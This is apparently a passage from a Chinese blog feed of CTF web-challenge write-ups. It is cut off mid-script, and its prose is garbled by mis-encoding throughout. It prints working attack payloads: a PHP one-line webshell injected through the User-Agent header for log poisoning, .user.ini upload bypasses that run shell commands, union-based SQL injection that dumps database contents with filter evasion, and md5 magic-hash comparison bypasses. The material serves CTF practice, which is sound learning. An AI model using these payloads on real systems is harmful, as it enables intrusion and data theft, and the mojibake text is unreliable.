æ‰“å¼€èšå‰‘ï¼ŒæˆåŠŸè¿æ¥ï¼Œæ‰¾åˆ°flag<br>ä¹Ÿå¯ä»¥åœ¨posté‡Œè¾“å…¥a&#x3D;system(â€œcat ..&#x2F;flag.phpâ€);<br>æ‰¾åˆ°flag</p><h2 id="web157"><a href="#web157" class="headerlink" title="web157"></a>web157</h2><p>æœ¬é¢˜åˆæ·»åŠ è¿‡æ»¤äº†;<br>æˆ‘ä»¬å¯ä»¥æŠŠè¯­å¥ç”¨æ‹¬å·()åŒ…å«ï¼Œ<br>1.png<br>å†…å®¹ï¼š<code>&lt;?=(system(&quot;cat ../fla*&quot;))?&gt;</code></p><p>.user.ini<br>å†…å®¹ï¼š<code>auto_prepend_file=1.png</code></p><p>ä¸Šä¼ è¿™ä¸¤ä¸ªåè¿›å…¥&#x2F;uploadæŸ¥çœ‹flag</p><h2 id="web158"><a href="#web158" class="headerlink" title="web158"></a>web158</h2><p>åŒ157é¢˜</p><h2 id="web159"><a href="#web159" class="headerlink" title="web159"></a>web159</h2><p>æœ¬é¢˜åˆè¿‡æ»¤äº†æ‹¬å·ï¼Œæˆ‘ä»¬å¯ä»¥ç”¨åå¼•å·ä»£æ›¿æ‹¬å·<br>1.png<br>å†…å®¹ï¼š<code>&lt;?= `cat ../fla*`?&gt;</code></p><p>.user.ini<br>å†…å®¹ï¼š<code>auto_prepend_file=1.png</code></p><p>ä¸Šä¼ åè¿›å…¥&#x2F;uploadæŸ¥çœ‹flag</p><h2 id="web160"><a href="#web160" class="headerlink" title="web160"></a>web160</h2><p>æœ¬é¢˜æ·»åŠ äº†æ—¥å¿—åŒ…å«ï¼Œnginxçš„æ—¥å¿—åœ¨&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.logï¼Œè¿‡æ»¤äº†logï¼Œç”¨.æ‹¼æ¥<br>includeâ€&#x2F;var&#x2F;loâ€.â€g&#x2F;nginx&#x2F;access.loâ€.â€gâ€</p><p>é¦–å…ˆå…ˆä¸Šä¼ .user.ini<br>å†…å®¹ï¼š<code>auto_prepend_file=1.png</code></p><p>å†ä¸Šä¼ 1.png<br>å†…å®¹ï¼š<code>&lt;?=include&quot;/var/lo&quot;.&quot;g/nginx/access.lo&quot;.&quot;g&quot;?&gt;</code></p><p>è¿›å…¥&#x2F;uoload å‘ç°æ—¥å¿—åŒ…å«uaå¤´,æˆ‘ä»¬åœ¨uaå¤´å†™catè¯­å¥<br>User-Agent:<code>&lt;?=`cat ../fla*`?&gt;</code><br>æˆåŠŸæ˜¾ç¤ºflag</p><h2 id="web161"><a href="#web161" class="headerlink" title="web161"></a>web161</h2><p>æœ¬é¢˜è¾ƒä¸Šä¸€é¢˜æ·»åŠ äº†ç»•è¿‡PHPå‡½æ•°getimagesize()æ£€æµ‹æ–‡ä»¶å¤´ï¼Œè€å¥—è·¯ï¼Œä¸Šä¼ çš„æ–‡ä»¶é¦–è¡Œéƒ½åŠ ä¸€ä¸ªGIF89A,å…¶ä½™æ“ä½œåŒ160é¢˜</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>ctf_web</title>
    <link href="/2023/05/23/ctfweb/"/>
    <url>/2023/05/23/ctfweb/</url>
    
    <content type="html"><![CDATA[<h2 id="web1"><a href="#web1" class="headerlink" title="web1"></a>web1</h2><p>ctrl+uæŸ¥çœ‹æºä»£ç å³å¯æ‰¾åˆ°base64ç¼–ç å½¢å¼çš„flag</p><h2 id="web2"><a href="#web2" class="headerlink" title="web2"></a>web2</h2><p>è¾“å…¥ä¸‡èƒ½é’¥åŒ™<br><img src="/images/fuck.png"><br>ä½¿ç”¨burp suiteæŠ“åŒ…<br>åœ¨burp suiteé‡Œå³é”®é€‰æ‹©send to repeater<br>ä½¿ç”¨è”åˆæŸ¥è¯¢æ¥æŸ¥è¯¢å›æ˜¾ä½ç½®</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">1</span>&#x27; or <span class="hljs-number">1</span>=<span class="hljs-number">1</span> union select <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>#<br></code></pre></td></tr></table></figure><p><img src="/images/1.png"><br>æ¥ç€å°±æ˜¯çˆ†åº“</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">1</span>&#x27; or <span class="hljs-number">1</span>=<span class="hljs-number">1</span> union select <span class="hljs-number">1</span>,database(),<span class="hljs-number">3</span>#<br></code></pre></td></tr></table></figure><p>çˆ†è¡¨</p><figure class="highlight q"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs q"><span class="hljs-number">1</span>&#x27; <span class="hljs-built_in">or</span> <span class="hljs-number">1</span>=<span class="hljs-number">1</span> <span class="hljs-built_in">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,group_concat(table_name),<span class="hljs-number">3</span> <span class="hljs-keyword">from</span> information_schema.<span class="hljs-built_in">tables</span> <span class="hljs-built_in">where</span> table_schema=database()#<br></code></pre></td></tr></table></figure><p>çˆ†å­—æ®µ</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">1</span>&#x27; or <span class="hljs-number">1</span>=<span class="hljs-number">1</span> union select <span class="hljs-number">1</span>,group_concat(column_name),<span class="hljs-number">3</span> fron information_schema.columns where table_name=&#x27;flag&#x27;#<br></code></pre></td></tr></table></figure><p>çˆ†å€¼</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">1</span>&#x27; or <span class="hljs-number">1</span>=<span class="hljs-number">1</span> union select <span class="hljs-number">1</span>,flag,<span class="hljs-number">3</span> from flag#<br></code></pre></td></tr></table></figure><p><img src="/images/2.png"><br>è·å¾—flag</p><h2 id="web3"><a href="#web3" class="headerlink" title="web3"></a>web3</h2><p>é¡µé¢ä¸­æ˜¾ç¤ºäº†éƒ¨åˆ†æºç ï¼Œæ˜æ˜¾æ˜¯å¼•å¯¼æˆ‘ä»¬åˆ©ç”¨æ–‡ä»¶åŒ…å«æ¼æ´è¿›è¡Œæ“ä½œï¼Œæºç ä¸­çš„include()å‡½æ•°é€šè¿‡GETè¯·æ±‚æ¥å—ä¸€ä¸ªurlå‚æ•°ï¼Œé‚£æ¥ä¸‹æ¥æˆ‘ä»¬å°±ç»™å®ƒä¼ é€’ä¸€ä¸ªurlå‚æ•°</p><p>è¿™é‡Œæˆ‘ä»¬ä½¿ç”¨burp suiteæŠ“åŒ…ï¼Œåˆ©ç”¨php:&#x2F;&#x2F;inputä¼ªåè®®æ‰§è¡ŒPHPä»£ç ï¼Œä»£ç çš„å†…å®¹ä¸ºæ‰§è¡Œç³»ç»Ÿå‘½ä»¤ï¼ŒæŸ¥çœ‹å½“å‰ç›®å½•ä¸‹æ‰€æœ‰æ–‡ä»¶ã€‚</p><p><img src="/images/3.png"></p><p>å¾ˆæ˜æ˜¾è¿™ä¸ªctf_go_go_goæ–‡ä»¶å°±æ˜¯å­˜æ”¾flagçš„æ–‡ä»¶<br><img src="/images/4.png"><br>æˆ‘ä»¬ç›´æ¥åœ¨urlåœ°å€ä¸­æ‹¼æ¥urlå‚æ•°ï¼Œè®¿é—®ctf_go_goæ–‡ä»¶</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">url</span>=ctf_go_go_go<br></code></pre></td></tr></table></figure><p>æˆåŠŸè·å–flag!</p><h2 id="web4"><a href="#web4" class="headerlink" title="web4"></a>web4</h2><p>è¿›å…¥é¢˜ç›®ï¼Œçœ‹åˆ°åªæœ‰ä¸€å¥æ–‡ä»¶åŒ…å«çš„æç¤ºã€‚<br>è¿™é¢˜ä½¿ç”¨inputåè®®dataåè®®éƒ½ä¸å¯è¡Œï¼Œåº”è¯¥æ˜¯è¢«ç¦ç”¨äº†ï¼Œæ‰€ä»¥ä»æ•°æ®åŒ…å…¥æ‰‹<br><img src="/images/5.png"></p><p>æˆ‘ä»¬å‘ç°è¯¥é“é¢˜ä½¿ç”¨çš„æ˜¯nginxæœåŠ¡å™¨ï¼Œé‚£æˆ‘ä»¬æƒ³åˆ°å¯ä¸å¯ä»¥é€šè¿‡æ—¥å¿—æ–‡ä»¶è¿›è¡Œå†™ç å¾—åˆ°flagå‘¢ï¼Œæ‰€ä»¥æˆ‘ä»¬è®¿é—®æ—¥å¿—çœ‹çœ‹</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">?url=<span class="hljs-regexp">/var/</span>lg<span class="hljs-regexp">/nginx/</span>access.log<br></code></pre></td></tr></table></figure><p><img src="/images/6.png"></p><blockquote><p>æŸ¥çœ‹æ—¥å¿—å‘ç°ï¼Œæ¯è®¿é—®ä¸€æ¬¡æ•°æ®åŒ…ä¸­çš„User-Agentå¤´ä¼šè¢«å†™è¿›æ—¥å¿—ä¸­ï¼Œé‚£å°±å°è¯•åœ¨UAå¤´ä¸­å†™ç </p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]);<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><img src="/images/7.png"></p><blockquote><p>åœ¨UAå¤´åæ’å…¥ä¸€å¥è¯æœ¨é©¬åæ—¥å¿—æ–‡ä»¶é‡Œå¹¶æœªæ˜¾ç¤ºè¯´æ˜æœ¨é©¬å·²ç»è¢«è§£æäº†ï¼Œç„¶åä½¿ç”¨èšå‰‘è¿æ¥ã€‚</p></blockquote><p><img src="/images/8.png"><br>è¿æ¥åï¼Œflagå°±åœ¨ç½‘é¡µæ ¹ç›®å½•ä¸­<br><img src="/images/9.png"><br>è·å¾—flagï¼</p><h2 id="web5"><a href="#web5" class="headerlink" title="web5"></a>web5</h2><p>é¦–å…ˆæ‰“å¼€é¡µé¢æ˜¯ä¸€ä¸ªé¡µé¢æºç ï¼Œæˆ‘ä»¬å…ˆæ¥è¿›è¡Œä»£ç å®¡è®¡ï¼Œçœ‹çœ‹æœ‰æ²¡æœ‰å¯ä»¥åˆ©ç”¨çš„åœ°æ–¹</p><p>é‡ç‚¹å®¡è®¡è¿™æ®µä»£ç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>        <span class="hljs-variable">$flag</span>=<span class="hljs-string">&quot;&quot;</span>;<br>        <span class="hljs-variable">$v1</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;v1&#x27;</span>];<br>        <span class="hljs-variable">$v2</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;v2&#x27;</span>];<br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$v1</span>) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$v2</span>))&#123;<br>            <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">ctype_alpha</span>(<span class="hljs-variable">$v1</span>))&#123;<br>                <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;v1 error&quot;</span>);<br>            &#125;<br>            <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">is_numeric</span>(<span class="hljs-variable">$v2</span>))&#123;<br>                <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;v2 error&quot;</span>);<br>            &#125;<br>            <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$v1</span>)==<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$v2</span>))&#123;<br>                <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>            &#125;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>        <br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;where is flag?&quot;</span>;<br>        &#125;<br>    <span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>æœ‰å››ä¸ªifè¯­å¥ï¼Œæ„é€ çš„v1å’Œv2æ»¡è¶³è¿™ä¸‰ä¸ªæ¡ä»¶å³å¯å¾—åˆ°flag<br>ç¬¬ä¸€ä¸ªifè¯­å¥è¦æ±‚v1å’Œv2ä¸èƒ½ä¸ºç©º<br>è¿™é‡Œæœ‰ä¸¤ä¸ªphpæ£€æµ‹å‡½æ•°</p><blockquote><ul><li>ctype_alpha â€”â€”åšçº¯å­—ç¬¦æ£€æµ‹</li><li>ctype_alpha(string $text): bool</li></ul></blockquote><p>æŸ¥çœ‹æä¾›çš„stringï¼Œtexté‡Œé¢çš„æ‰€æœ‰å­—ç¬¦æ˜¯å¦åªåŒ…å«å­—ç¬¦ã€‚ åœ¨æ ‡å‡†çš„ C è¯­è¨€ç¯å¢ƒä¸‹ï¼Œå­—æ¯ä»…ä»…æ˜¯æŒ‡ [A-Za-z] ï¼Œ ctype_alpha() ç­‰åŒäº (ctype_upper($text) || ctype_lower($text)) å¦‚æœ text æ˜¯ç®€å•çš„å•ä¸ªå­—ç¬¦ä¸²è¿˜å¥½ï¼Œä½†æ˜¯åœ¨å…¶ä»–è¯­è¨€ä¸­æœ‰äº›å­—æ¯è¢«è®¤ä¸ºæ—¢ä¸æ˜¯å¤§å†™ä¹Ÿä¸æ˜¯å°å†™ã€‚</p><p>æ‰€ä»¥ï¼Œæˆ‘ä»¬æ„é€ çš„v1å¿…é¡»æ˜¯åªæœ‰å­—æ¯ï¼Œæ‰èƒ½ç»•è¿‡ç¬¬äºŒä¸ªifè¯­å¥çš„è¿‡æ»¤</p><blockquote><ul><li>is_numeric()å‡½æ•°ç”¨äºæ£€æµ‹å˜é‡æ˜¯å¦ä¸ºæ•°å­—æˆ–æ•°å­—å­—ç¬¦ä¸²ã€‚<br>å¦‚æœæŒ‡å®šçš„å˜é‡æ˜¯æ•°å­—å’Œæ•°å­—å­—ç¬¦ä¸²åˆ™è¿”å›TRUEï¼Œå¦åˆ™è¿”å›FALSEï¼Œæ³¨æ„æµ®ç‚¹å‹è¿”å›ç©ºå€¼ï¼Œå³è¿”å›FALSEã€‚</li></ul></blockquote><p>ä¹Ÿå°±æ˜¯è¯´ï¼Œv2å¿…é¡»æ˜¯åªæœ‰æ•°å­—ï¼Œæ‰èƒ½ç»•è¿‡ç¬¬ä¸‰ä¸ªifè¯­å¥çš„è¿‡æ»¤</p><p>ç„¶åå†çœ‹æœ€åä¸€æ¡ifè¯­å¥ï¼Œè¦æ±‚v1å’Œv2çš„å€¼ç»è¿‡MD5åŠ å¯†åè¿˜å¿…é¡»ç›¸ç­‰ï¼Œif(md5($v1)&#x3D;&#x3D;md5($v2)),æ¥ä¸‹æ¥æˆ‘ä»¬å¼€å§‹æƒ³æ–¹æ³•æ„é€ v1å’Œv2çš„å€¼</p><p>md5æ¼æ´ä»‹ç»ï¼š<br>PHPåœ¨å¤„ç†å“ˆå¸Œå­—ç¬¦ä¸²æ—¶ï¼Œå®ƒæŠŠæ¯ä¸€ä¸ªä»¥â€œ0Eâ€å¼€å¤´çš„å“ˆå¸Œå€¼éƒ½è§£é‡Šä¸º0<br>æ‰€ä»¥åªè¦v1ä¸v2çš„md5å€¼ä»¥0Eå¼€å¤´å³å¯ã€‚è¿™æ ·æœ€åphpè§£æåˆ°çš„v1å’Œv2çš„md5å€¼å°±éƒ½æ˜¯0äº†<br>æ„é€ v1&#x3D;QNKCDZO&amp;v2&#x3D;240610708</p><p>0eå¼€å¤´çš„md5å’ŒåŸå€¼ï¼š<br>QNKCDZO<br>0e830400451993494058024219903391<br>240610708<br>0e462097431906509019562988736854</p><p>è¾“å…¥åˆ°urlä¸­ï¼ŒæˆåŠŸè·å–flag</p><h2 id="web6"><a href="#web6" class="headerlink" title="web6"></a>web6</h2><p>usernameå°è¯•è¾“å…¥ä¸‡èƒ½å¯†ç 1â€™ or 1&#x3D;1#<br>å¯†ç éšæ„<br>æ˜¾ç¤ºsql inject errorï¼Œå‘ç°æœ‰å­—ç¬¦è¢«è¿‡æ»¤ã€‚<br>é€ä¸ªå­—ç¬¦è¾“å…¥åå‘ç°è¿‡æ»¤äº†ç©ºæ ¼ï¼Œä¸€èˆ¬ç©ºæ ¼è¢«è¿‡æ»¤æœ‰å¦‚ä¸‹æ›¿æ¢æ–¹æ³•</p><blockquote><p>&#x2F;**&#x2F;<br>()<br>å›è½¦(urlç¼–ç ä¸­çš„%0a)<br>&#96;(tapé”®ä¸Šé¢çš„æŒ‰é’®)<br>tap<br>ä¸¤ä¸ªç©ºæ ¼</p></blockquote><p>è¿™é‡Œé€‰æ‹©&#x2F;**&#x2F;</p><p>æ¥ä¸‹æ¥å°±åˆ°äº†å¹¿ä¸ºäººçŸ¥çš„çˆ†åº“ï¼Œçˆ†è¡¨ï¼Œçˆ†å­—æ®µï¼Œçˆ†å­—æ®µå€¼ç¯èŠ‚</p><p>çˆ†åº“</p><figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gauss"><span class="hljs-number">1</span>&#x27;<span class="hljs-comment">/**/</span><span class="hljs-keyword">or</span><span class="hljs-comment">/**/</span><span class="hljs-number">1</span>=<span class="hljs-number">1</span><span class="hljs-comment">/**/</span><span class="hljs-built_in">union</span><span class="hljs-comment">/**/</span><span class="hljs-built_in">select</span><span class="hljs-comment">/**/</span><span class="hljs-number">1</span>,<span class="hljs-built_in">database</span>(),<span class="hljs-number">3</span><span class="hljs-meta">#</span><br></code></pre></td></tr></table></figure><p>çˆ†è¡¨</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><span class="hljs-number">1&#x27;</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">or</span><span class="hljs-comment">/**/</span><span class="hljs-number">1</span>=<span class="hljs-number">1</span><span class="hljs-comment">/**/</span>union<span class="hljs-comment">/**/</span><span class="hljs-keyword">select</span><span class="hljs-comment">/**/</span><span class="hljs-number">1</span>,(<span class="hljs-keyword">select</span><span class="hljs-comment">/**/</span>group_concat(table_name)<span class="hljs-comment">/**/</span><span class="hljs-keyword">from</span><span class="hljs-comment">/**/</span>information_schema.tables<span class="hljs-comment">/**/</span><span class="hljs-keyword">where</span><span class="hljs-comment">/**/</span>table_schema=database()),<span class="hljs-number">3</span><span class="hljs-meta">#</span><br></code></pre></td></tr></table></figure><p>çˆ†å­—æ®µ</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><span class="hljs-number">1&#x27;</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">or</span><span class="hljs-comment">/**/</span><span class="hljs-number">1</span>=<span class="hljs-number">1</span><span class="hljs-comment">/**/</span>union<span class="hljs-comment">/**/</span><span class="hljs-keyword">select</span><span class="hljs-comment">/**/</span><span class="hljs-number">1</span>,(<span class="hljs-keyword">select</span><span class="hljs-comment">/**/</span>group_concat(column_name)<span class="hljs-comment">/**/</span><span class="hljs-keyword">from</span><span class="hljs-comment">/**/</span>information_schema.columns<span class="hljs-comment">/**/</span><span class="hljs-keyword">where</span><span class="hljs-comment">/**/</span>table_name=<span class="hljs-string">&#x27;flag&#x27;</span>),<span class="hljs-number">3</span><span class="hljs-meta">#</span><br></code></pre></td></tr></table></figure><p>çˆ†å­—æ®µå€¼</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><span class="hljs-number">1&#x27;</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">or</span><span class="hljs-comment">/**/</span><span class="hljs-number">1</span>=<span class="hljs-number">1</span><span class="hljs-comment">/**/</span>union<span class="hljs-comment">/**/</span><span class="hljs-keyword">select</span><span class="hljs-comment">/**/</span><span class="hljs-number">1</span>,(<span class="hljs-keyword">select</span><span class="hljs-comment">/**/</span>flag<span class="hljs-comment">/**/</span><span class="hljs-keyword">from</span><span class="hljs-comment">/**/</span>flag),<span class="hljs-number">3</span><span class="hljs-meta">#</span><br></code></pre></td></tr></table></figure><p>å¾—åˆ°flag</p><h2 id="web7"><a href="#web7" class="headerlink" title="web7"></a>web7</h2><p>åˆåˆåˆæ˜¯sqlæ³¨å…¥æ¼æ´é¢˜<br>ä¸€å…±æœ‰ä¸‰ä¸ªæ–‡ç« ï¼Œé€šè¿‡ç‚¹å‡»åˆ‡æ¢ä¸åŒçš„æ–‡ç« å¯ä»¥çœ‹å‡ºurlåœ°å€çš„å·®åˆ«ï¼Œé¡µé¢åŒè¿‡æ–‡ç« çš„idå€¼æ¥æŸ¥è¯¢æ–‡ç« å†…å®¹ï¼Œæˆ‘ä»¬å¯ä»¥è€ƒè™‘sqlæ³¨å…¥æ¼æ´<br><img src="/images/10.png"><br>é¦–å…ˆåˆ¤æ–­æ³¨å…¥ç‚¹ï¼Œè¾“å…¥ä»¥ä¸‹payloadï¼Œä½¿sqlæ’æˆç«‹</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">?id=<span class="hljs-number">1</span><span class="hljs-regexp">/**/</span>and<span class="hljs-regexp">/**/</span><span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>é¡µé¢æ­£å¸¸æ˜¾ç¤º</p><p>å†è¾“å…¥ä»¥ä¸‹payloadï¼Œä½¿sqlæ’ä¸æˆç«‹</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">?id=<span class="hljs-number">1</span><span class="hljs-regexp">/**/</span>and<span class="hljs-regexp">/**/</span><span class="hljs-number">0</span><br></code></pre></td></tr></table></figure><p>é¡µé¢ç©ºæ˜¾ç¤º</p><p>ç”±æ­¤å¯ä»¥åˆ¤æ–­é¡µé¢å­˜åœ¨sqlæ³¨å…¥ï¼Œæ³¨å…¥ç‚¹ä¸º<strong>æ•°å€¼å‹æ³¨å…¥</strong>ï¼Œé¡µé¢ä¸­æœ‰æ˜¾ç¤ºä½ï¼Œå¯ä»¥å°è¯•<strong>è”åˆæ³¨å…¥</strong>è¿›è¡Œè„±åº“<br>å…ˆæ¥åˆ¤æ–­æ˜¾ç¤ºä½ï¼Œæ­¤å¤„idä¼ ä¸€ä¸ª-1ï¼Œç”±äºidé€šå¸¸ä¸ä¸ºè´Ÿæ•°ï¼Œåç«¯æ ¹æ®idæŸ¥è¯¢ä¸åˆ°å†…å®¹ï¼Œå°±åªèƒ½å±•ç¤ºè”åˆæŸ¥è¯¢çš„ç»“æœï¼Œä»è€Œå¸®åŠ©æˆ‘ä»¬åˆ¤æ–­å­—æ®µæ˜¾ç¤ºçš„ä½ç½®</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">-<span class="hljs-number">1</span><span class="hljs-regexp">/**/u</span>nion<span class="hljs-regexp">/**/</span>select<span class="hljs-regexp">/**/</span><span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span><br></code></pre></td></tr></table></figure><p><img src="/images/11.png"><br>ä¸‹é¢å°±æ˜¯å¹¿ä¸ºäººçŸ¥çš„çˆ†*ç¯èŠ‚äº†<br>çˆ†åº“</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">-<span class="hljs-number">1</span><span class="hljs-regexp">/**/u</span>nion<span class="hljs-regexp">/**/</span>select<span class="hljs-regexp">/**/</span><span class="hljs-number">1</span>,database(),<span class="hljs-number">3</span><br></code></pre></td></tr></table></figure><p>çˆ†è¡¨</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-number">-1</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">union</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">select</span><span class="hljs-comment">/**/</span><span class="hljs-number">1</span>,(<span class="hljs-keyword">select</span><span class="hljs-comment">/**/</span>group_concat(<span class="hljs-built_in">table_name</span>)<span class="hljs-keyword">from</span><span class="hljs-comment">/**/</span>information_schema.<span class="hljs-keyword">tables</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">where</span><span class="hljs-comment">/**/</span>table_schema=<span class="hljs-keyword">database</span>()),<span class="hljs-number">3</span><br></code></pre></td></tr></table></figure><p>çˆ†å­—æ®µ</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-number">-1</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">union</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">select</span><span class="hljs-comment">/**/</span><span class="hljs-number">1</span>,(<span class="hljs-keyword">select</span><span class="hljs-comment">/**/</span>group_concat(<span class="hljs-built_in">column_name</span>)<span class="hljs-keyword">from</span><span class="hljs-comment">/**/</span>information_schema.<span class="hljs-keyword">columns</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">where</span><span class="hljs-comment">/**/</span><span class="hljs-built_in">table_name</span>=&quot;flag&quot;),<span class="hljs-number">3</span><br></code></pre></td></tr></table></figure><p>çˆ†å­—æ®µå€¼</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">-<span class="hljs-number">1</span><span class="hljs-regexp">/**/u</span>nion<span class="hljs-regexp">/**/</span>select<span class="hljs-regexp">/**/</span><span class="hljs-number">1</span>,(select<span class="hljs-regexp">/**/</span>flag<span class="hljs-regexp">/**/</span>from<span class="hljs-regexp">/**/</span>flag),<span class="hljs-number">3</span><br></code></pre></td></tr></table></figure><p>æˆåŠŸè·å–flagå€¼</p><h2 id="web8"><a href="#web8" class="headerlink" title="web8"></a>web8</h2><p>æœ¬é¢˜è¿‡æ»¤äº†ç©ºæ ¼ï¼Œé€—å·ï¼Œandï¼Œunionç­‰å…³é”®å­—<br>ç©ºæ ¼ä¾æ—§æ˜¯ç”¨&#x2F;**&#x2F;æ›¿ä»£<br>andå¯ä½¿ç”¨or æ›¿ä»£</p><p>é¦–å…ˆç‹ ç‹ çš„æ³¨å…¥ï¼Œè¾“å…¥ä»¥ä¸‹payloadä½¿sqlæ’æˆç«‹</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">?id=-<span class="hljs-number">1</span><span class="hljs-regexp">/**/</span>or<span class="hljs-regexp">/**/</span><span class="hljs-number">1</span>=<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>ç”±äºsqlæ’æˆç«‹ï¼Œæ•°æ®åº“å°†æŸ¥è¯¢å‡ºè¡¨ä¸­çš„æ‰€æœ‰å†…å®¹ï¼Œå¹¶è¿”å›åˆ°å‰ç«¯å±•ç¤º<br><img src="/images/555.png"></p><p>åœ¨è¾“å…¥ä»¥ä¸‹payloadä½¿sqlæ’ä¸æˆç«‹</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">?id=-<span class="hljs-number">1</span><span class="hljs-regexp">/**/</span>or<span class="hljs-regexp">/**/</span><span class="hljs-number">1</span>=<span class="hljs-number">2</span><br></code></pre></td></tr></table></figure><p>ç”±äºsqlæ’ä¸æˆç«‹ï¼Œæ•°æ®åº“æŸ¥è¯¢ä¸åˆ°ä»»ä½•æ•°æ®ï¼Œä»è€Œå¯¼è‡´é¡µé¢ç©ºæ˜¾ç¤º</p><p>ç”±ä»¥ä¸Šç»“æœå¯çŸ¥ï¼Œè¯¥é¡µé¢å­˜åœ¨sqlæ³¨å…¥ï¼Œæ³¨å…¥ç‚¹ä¸ºæ•°å€¼å‹æ³¨å…¥</p><p>æ¥ä¸‹æ¥è¿›è¡Œè„±åº“ï¼Œç”±äºç›²æ³¨è„±åº“æ¯”è¾ƒå¤æ‚ï¼Œæ­¤å¤„æˆ‘ä»¬æ‹¿æŠ„æ¥çš„pythonè„šæœ¬ğŸ˜Šè¿›è¡Œè‡ªåŠ¨åŒ–è„±åº“ï¼Œæ³¨æ„payloadä¸­çš„å­—ç¬¦ä¸²ä¸æ¢è¡Œï¼Œå¦åˆ™å¯èƒ½ä¼šå‡ºé—®é¢˜</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span 